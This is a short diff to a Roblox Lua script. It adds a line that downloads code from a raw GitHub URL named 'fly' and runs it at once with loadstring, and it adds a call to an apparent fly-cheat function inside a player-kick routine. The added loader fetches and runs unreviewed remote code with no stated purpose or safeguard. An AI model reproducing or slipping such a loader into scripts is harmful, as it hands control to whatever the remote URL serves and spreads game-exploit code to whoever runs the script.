@@ -1,4 +1,6 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/hussain1234234/pizza/main/fly'),true))()
 function kick()
+    sFLY()
     local mteamp = game:GetService("Teams").Manager
     local m = mteamp:GetPlayers()[1]
     --check if player have sword
